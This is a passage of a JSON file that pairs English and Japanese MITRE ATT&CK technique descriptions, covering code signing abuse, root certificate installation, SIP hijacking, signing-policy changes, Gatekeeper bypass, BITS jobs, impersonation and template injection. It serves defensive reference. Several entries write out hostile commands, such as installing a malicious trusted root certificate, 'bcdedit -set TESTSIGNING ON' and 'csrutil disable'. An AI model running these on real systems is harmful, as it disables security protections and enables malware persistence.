                        "description_jp": "攻撃者は、マルウェアやツールに署名するために、コード署名マテリアルを作成、取得、または盗む可能性があります。コード署名は、開発者からのバイナリの信頼性のレベルと、バイナリが改ざんされていないことの保証を提供します。(引用: Wikipedia Code Signing) 操作中に使用される証明書は、攻撃者によって作成、取得、または盗まれる可能性があります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates) [無効なコード署名](https://attack.mitre.org/techniques/T1036/001)とは異なり、このアクティビティは有効な署名になります。\n\n初回実行時にソフトウェアを検証するためのコード署名は、最新のWindowsおよびmacOSシステムで使用できます。プラットフォームの分散型の性質のため、Linuxでは使用されません。(引用: Wikipedia Code Signing)(引用: EclecticLightChecksonEXECodeSigning)\n\nコード署名証明書は、システム上で署名済みコードの実行を要求するセキュリティポリシーをバイパスするために使用される場合があります。"
                    },
                    {
                        "id": "T1553.004",
                        "name_eng": "Install Root Certificate",
                        "name_jp": "ルート証明書のインストール",
                        "description_eng": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
                        "description_jp": "攻撃者は、攻撃者が制御するWebサーバーに接続する際の警告を回避するために、侵害されたシステムにルート証明書をインストールする可能性があります。ルート証明書は、公開鍵暗号方式でルート認証局（CA）を識別するために使用されます。ルート証明書がインストールされると、システムまたはアプリケーションは、ルート証明書によって署名されたルートの信頼チェーン内の証明書を信頼します。(引用: Wikipedia Root Certificate) 証明書は一般的に、Webブラウザ内で安全なTLS/SSL通信を確立するために使用されます。ユーザーが信頼できない証明書を提示するWebサイトを閲覧しようとすると、セキュリティリスクをユーザーに警告するエラーメッセージが表示されます。セキュリティ設定によっては、ブラウザがユーザーがWebサイトへの接続を確立することを許可しない場合があります。\n\n侵害されたシステムにルート証明書をインストールすると、攻撃者はそのシステムのセキュリティを低下させる方法を得ることになります。攻撃者はこのテクニックを使用して、ログイン資格情報を収集するために正当なウェブサイトを偽装する攻撃者が制御するウェブサーバーに、侵害されたシステムがHTTPS経由で接続する際にユーザーに警告するセキュリティ警告を回避しています。(引用: Operation Emmental)\n\n非定型のルート証明書も、製造元またはソフトウェアサプライチェーンによってシステムにプリインストールされており、安全なTLS/SSL通信で送信される情報を傍受するための[中間者攻撃](https://attack.mitre.org/techniques/T1557)機能を提供するためにマルウェア/アドウェアと組み合わせて使用​​されていました。(引用: Kaspersky Superfish)\n\nルート証明書（および関連するチェーン）も複製して再インストールできます。複製された証明書チェーンは、ソースと同じメタデータ特性の多くを持ち、署名検証ツール（Sysinternals、ウイルス対策ソフトなど）をバイパスして実行をブロックしたり、永続性のアーティファクトを明らかにしたりする可能性のある悪意のあるコードに署名するために使用できます。(引用: SpectorOps Code Signing Dec 2017)\n\nmacOSでは、Ay MaMiマルウェアは<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>を使用して、悪意のある証明書を信頼されたルート証明書としてシステムキーチェーンにインストールします。(引用: objective-see ay mami 2018)"
                    },
                    {
                        "id": "T1553.003",
                        "name_eng": "SIP and Trust Provider Hijacking",
                        "name_jp": "SIPおよび信頼プロバイダーハイジャック",
                        "description_eng": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
                        "description_jp": "攻撃者は、署名検証チェックを実行する際にオペレーティングシステムやアプリケーション制御ツールを誤解させるために、SIPおよび信頼プロバイダーコンポーネントを改ざんする可能性があります。ユーザーモードでは、Windows Authenticode（引用: Microsoft Authenticode）デジタル署名は、ファイルの出所と整合性を検証するために使用されます。これらは、署名済みコードの信頼を確立するために使用できる変数です（例：有効なMicrosoft署名を持つドライバーは安全として扱われる場合があります）。署名検証プロセスは、WinVerifyTrustアプリケーションプログラミングインターフェイス（API）関数を介して処理されます（引用: Microsoft WinVerifyTrust）。この関数は照会を受け付け、署名のパラメータを検証する責任を負う適切な信頼プロバイダーと連携します。(引用: SpectorOps Subverting Trust Sept 2017)\n\n実行可能ファイルの種類や対応する署名形式がさまざまであるため、MicrosoftはAPI関数とファイルの間の抽象化レイヤーを提供するために、サブジェクトインターフェイスパッケージ（SIP）と呼ばれるソフトウェアコンポーネントを作成しました。(引用: EduardosBlog SIPs July 2008) SIPは、API関数が署名を作成、取得、計算、検証できるようにする責任を負います。ほとんどのファイル形式（実行可能ファイル、PowerShell、インストーラーなど。カタログ署名は包括的なものを提供します(引用: Microsoft Catalog Files and Signatures April 2017)）には一意のSIPが存在し、グローバル一意識別子（GUID）によって識別されます。(引用: SpectorOps Subverting Trust Sept 2017)\n\n[コード署名](https://attack.mitre.org/techniques/T1553/002)と同様に、敵対者はこのアーキテクチャを悪用して信頼制御を破壊し、正当に署名されたコードのみがシステム上で実行されることを許可するセキュリティポリシーをバイパスする可能性があります。敵対者は、SIPおよび信頼プロバイダーコンポーネントをハイジャックして、オペレーティングシステムおよびアプリケーション制御ツールを誤解させ、悪意のある（または任意の）コードを次のように署名済みとして分類させる可能性があります。(引用：SpectorOps Subverting Trust Sept 2017)\n\n* SIPのCryptSIPDllGetSignedDataMsg関数（署名済みファイルからエンコードされたデジタル証明書を取得する）を提供するダイナミックリンクライブラリ（DLL）を指す<code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code>の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更します。ファイルの実際の署名ではなく、既知の良好な署名値（例：ポータブル実行可能ファイルのMicrosoft署名）を常に返すエクスポート関数を持つ悪意のある細工されたDLLを指すことにより、敵対者はそのSIPを使用するすべてのファイルに許容可能な署名値を適用できます（引用：GitHub SIP POC Sept 2017）（ただし、関数によって返されるハッシュがファイルから計算された値と一致しないため、ハッシュの不一致が発生し、署名が無効になる可能性があります）。\n* SIPのCryptSIPDllVerifyIndirectData関数（ファイルの計算済みハッシュと署名済みハッシュ値を検証する）を提供するDLLを指す<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code>の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更します。常にTRUE（検証が成功したことを示す）を返すエクスポート関数を持つ悪意のある細工されたDLLを指すことにより、敵対者はそのSIPを使用して（前述のCryptSIPDllGetSignedDataMsg関数をハイジャックするかどうかにかかわらず）任意のファイル（正当な署名を持つ）を正常に検証できます（引用：GitHub SIP POC Sept 2017）。このレジストリ値は、ディスク上に新しいファイルをドロップして実行する必要性を回避し、既に存在するDLLの適切なエクスポート関数にリダイレクトすることもできます。\n* 信頼プロバイダーのFinalPolicy関数（デコードおよび解析された署名がチェックされ、信頼決定の大部分が行われる場所）を提供するDLLを指す<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code>の<code>DLL</code>および<code>Function</code>レジストリ値を変更します。SIPのCryptSIPDllVerifyIndirectData関数をハイジャックするのと同様に、この値は既に存在するDLLまたは悪意のある細工されたDLL（信頼プロバイダーの実装は複雑ですが）の適切なエクスポート関数にリダイレクトできます。\n* **注:** 上記のハイジャックは、[DLL](https://attack.mitre.org/techniques/T1574/001)検索順序ハイジャックを介してレジストリを変更することなく実行することも可能です。\n\nSIPまたは信頼プロバイダーコンポーネントをハイジャックすると、これらの悪意のあるコンポーネントがコード署名または署名検証を実行する任意のアプリケーションによって呼び出される可能性があるため、永続的なコード実行も可能になる場合があります。(引用: SpectorOps Subverting Trust Sept 2017)"
                    },
                    {
                        "id": "T1553.006",
                        "name_eng": "Code Signing Policy Modification",
                        "name_jp": "コード署名ポリシーの変更",
                        "description_eng": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
                        "description_jp": "攻撃者は、署名なしまたは自己署名コードの実行を可能にするために、コード署名ポリシーを変更する可能性があります。コード署名は、開発者からのプログラムの信頼性のレベルと、プログラムが改ざんされていないことの保証を提供します。セキュリティ制御には、有効な署名済みコードのみがオペレーティングシステムで実行されることを保証するための強制メカニズムが含まれる場合があります。\n\nこれらのセキュリティコントロールの一部は、Windowsのドライバー署名強制（DSE）やmacOSのシステム整合性保護（SIP）など、デフォルトで有効になっている場合があります。(引用: Microsoft DSE June 2017)(引用: Apple Disable SIP) その他のそのようなコントロールはデフォルトでは無効になっている場合がありますが、署名済みのダイナミックリンクライブラリ（DLL）のみがシステム上で実行されることを許可するなど、アプリケーションコントロールを通じて構成可能です。開発者がアプリケーションの開発およびテスト中にデフォルトの署名強制ポリシーを変更すると便利な場合があるため、昇格された権限でこれらの機能を無効にできる場合があります。(引用: Microsoft Unsigned Driver Apr 2017)(引用: Apple Disable SIP)\n\n敵対者は、コマンドラインやGUIユーティリティの使用、[レジストリの変更](https://attack.mitre.org/techniques/T1112)、デバッグ/リカバリモードでのコンピュータの再起動、またはカーネルメモリ内の変数の値を変更するなど、多くの方法でコード署名ポリシーを変更する可能性があります。(引用: Microsoft TESTSIGNING Feb 2021)(引用: Apple Disable SIP)(引用: FireEye HIKIT Rootkit Part 2)(引用: GitHub Turla Driver Loader) システムのコード署名ポリシーを変更できるコマンドの例としては、Windowsの<code>bcdedit.exe -set TESTSIGNING ON</code>やmacOSの<code>csrutil disable</code>などがあります。(引用：Microsoft TESTSIGNING Feb 2021)(引用：Apple Disable SIP) 実装によっては、署名ポリシーの変更に成功すると、侵害されたシステムの再起動が必要になる場合があります。さらに、一部の実装では、ユーザーに表示されるアーティファクト（画面の隅にシステムがテストモードであることを示す透かしなど）が導入される場合があります。攻撃者はそのようなアーティファクトを削除しようとする場合があります。(引用: F-Secure BlackEnergy 2014)\n\n署名チェックに関連する変数（ドライバー署名強制を無効にするための<code>g_CiOptions</code>の変更など）を変更するためにカーネルメモリへのアクセスを取得するには、攻撃者は署名済みだが脆弱なドライバーを使用して[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)を実行する可能性があります。(引用: Unit42 AcidBox June 2020)(引用: GitHub Turla Driver Loader)"
                    },
                    {
                        "id": "T1553.001",
                        "name_eng": "Gatekeeper Bypass",
                        "name_jp": "Gatekeeperバイパス",
                        "description_eng": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
                        "description_jp": "攻撃者はファイル属性を変更し、Gatekeeper機能を破壊してユーザープロンプトを回避し、信頼できないプログラムを実行する可能性があります。Gatekeeperは、Appleのセキュリティモデルのレイヤーとして機能し、信頼できるアプリケーションのみがホスト上で実行されることを保証する一連のテクノロジです。GatekeeperはSnow Leopard（10.6、2009）のファイル検疫に基づいて構築され、コード署名、セキュリティポリシーコンプライアンス、公証などを含むように成長しました。Gatekeeperはまた、初めて実行されるアプリケーションを再開されたアプリケーションとは異なる方法で扱います。(引用: TheEclecticLightCompany Quarantine and the flag)(引用: TheEclecticLightCompany apple notarization)\n\nオプトインシステムに基づいて、ファイルがダウンロードされると、ダウンロードを実行するアプリケーションによってファイルに<code>com.apple.quarantine</code>（検疫フラグとも呼ばれる）という拡張属性（xattr）が設定されることがあります。Launch Servicesはアプリケーションを中断状態で開きます。検疫フラグが設定された初回実行アプリケーションの場合、Gatekeeperは次の機能を実行します：\n\n1. 拡張属性の確認 – Gatekeeperは検疫フラグを確認し、実行を許可または拒否するためのアラートプロンプトをユーザーに表示します。(引用: OceanLotus for OS X)(引用: 20 macOS Common Tools and Techniques)\n\n2. システムポリシーの確認 - Gatekeeperはシステムのセキュリティポリシーを確認し、App Storeのみ、またはApp Storeと確認済みの開発者からのアプリの実行を許可します。\n\n3. コード署名 – GatekeeperはApple Developer IDからの有効なコード署名を確認します。\n\n4. 公証 - Gatekeeperは<code>api.apple-cloudkit.com</code> APIを使用してAppleサーバーに接続し、公証チケットを検証または取得し、チケットが失効していないことを確認します。ユーザーは公証を上書きでき、その結果、「未承認のアプリ」を実行するプロンプトが表示され、セキュリティポリシーが変更されます。\n\n敵対者は、ロジックエラー（例：[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)）、チェックされていないファイルタイプ、外部ライブラリを介して、Gatekeeperチェック内の1つまたは複数のセキュリティ制御を破壊する可能性があります。例えば、macOS 13 Venturaより前では、コード署名と公証チェックは最初の起動時にのみ実行されていたため、攻撃者はGatekeeperセキュリティチェックをバイパスするために、以前に開かれたアプリケーションに悪意のある実行可能ファイルを書き込むことができました。(引用: theevilbit gatekeeper bypass 2021)(引用: Application Bundle Manipulation Brandon Dalton)\n\nUSBフラッシュドライブ、光学ディスク、外付けハードドライブ、ローカルネットワーク経由で共有されたドライブからシステムにロードされたアプリケーションやファイル、またはcurlコマンドを使用してロードされたアプリケーションやファイルは、検疫フラグを設定しない場合があります。さらに、[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)を使用して検疫フラグの設定を回避することも可能です。"
                    }
                ]
            },
            {
                "id": "T1197",
                "name_eng": "BITS Jobs",
                "name_jp": "BITSジョブ",
                "description_eng": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
                "description_jp": "攻撃者はBITSジョブを悪用して、コードを永続的に実行したり、さまざまなバックグラウンドタスクを実行したりする可能性があります。Windows Background Intelligent Transfer Service (BITS) は、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) (COM) を介して公開される低帯域幅の非同期ファイル転送メカニズムです。(引用: Microsoft COM)(引用: Microsoft BITS) BITSは、他のネットワークアプリケーションを中断することなくバックグラウンドで（利用可能なアイドル帯域幅を使用して）動作することを好むアップデーター、メッセンジャー、およびその他のアプリケーションによって一般的に使用されます。ファイル転送タスクはBITSジョブとして実装され、1つ以上のファイル操作のキューが含まれています。\n\nBITSジョブを作成および管理するためのインターフェイスは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)および[BITSAdmin](https://attack.mitre.org/software/S0190)ツールを介してアクセスできます。(引用: Microsoft BITS)(引用: Microsoft BITSAdmin)\n\n攻撃者はBITSを悪用して、悪意のあるコードのダウンロード（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）、実行、さらには実行後のクリーンアップ（例：[インジケーター削除](https://attack.mitre.org/techniques/T1070)）を行う可能性があります。BITSタスクは新しいファイルやレジストリの変更なしにBITSジョブデータベースに自己完結しており、多くの場合ホストファイアウォールによって許可されています。(引用: CTU BITS Malware June 2016)(引用: Mondok Windows PiggyBack BITS May 2007)(引用: Symantec BITS May 2007) BITSによる実行はまた、長期間有効なジョブを作成したり（デフォルトの最大有効期間は90日であり、延長可能）、ジョブの完了時またはエラー時（システムの再起動後を含む）に任意のプログラムを呼び出したりすることにより、永続性を可能にする場合もあります。(引用: PaloAlto UBoatRAT Nov 2017)(引用: CTU BITS Malware June 2016)\n\nBITSアップロード機能は、[代替プロトコル経由のデータ持ち出し](https://attack.mitre.org/techniques/T1048)を実行するためにも使用できます。(引用: CTU BITS Malware June 2016)",
                "subtechniques": []
            },
            {
                "id": "T1656",
                "name_eng": "Impersonation",
                "name_jp": "なりすまし",
                "description_eng": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "description_jp": "攻撃者は、信頼できる人物や組織になりすまして、ターゲットを説得し騙して何らかの行動を代行させる可能性があります。例えば、攻撃者は、経営幹部、同僚、サードパーティベンダーなどの既知の送信者になりすまして、被害者と通信する可能性があります（[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)、[フィッシング](https://attack.mitre.org/techniques/T1566)、または[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)を介して）。確立された信頼は、その後、複数の被害者に対して、攻撃者の最終的な目標を達成するために利用される可能性があります。\n \nビジネスメール詐欺やメール詐欺キャンペーンの多くの場合、攻撃者はなりすましを使用して被害者を詐取します。つまり、被害者を騙して送金させたり、最終的に[金銭的窃盗](https://attack.mitre.org/techniques/T1657)を可能にする情報を漏洩させたりします。\n\n敵対者はまた、悪意のある活動が検出される前に被害者が迅速に行動するように仕向けるために、メールの件名や本文に「支払い」、「リクエスト」、「緊急」などの操作的で説得力のある言葉遣いなどのソーシャルエンジニアリング技術を使用することがよくあります。これらのキャンペーンは、多くの場合、職務やアクセス権限のために敵対者の目標を達成できる人々を特に標的にしています。\n \nなりすましは通常、[被害者ID情報の収集](https://attack.mitre.org/techniques/T1589)や[被害組織情報の収集](https://attack.mitre.org/techniques/T1591)などの偵察テクニックや、偽のIDを裏付けるためのメールドメイン（つまり[ドメイン](https://attack.mitre.org/techniques/T1583/001)）などのインフラストラクチャの取得に先行されます。(引用: CrowdStrike-BEC)\n \nなりすましを伴うキャンペーンでは、複数の被害者が発生する可能性があります。例えば、攻撃者はある組織を標的として[アカウントの侵害](https://attack.mitre.org/techniques/T1586)を行い、その後、他のエンティティに対するなりすましをサポートするために使用できます。(引用: VEC)",
                "subtechniques": []
            },
            {
                "id": "T1221",
                "name_eng": "Template Injection",
                "name_jp": "テンプレートインジェクション",
                "description_eng": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",
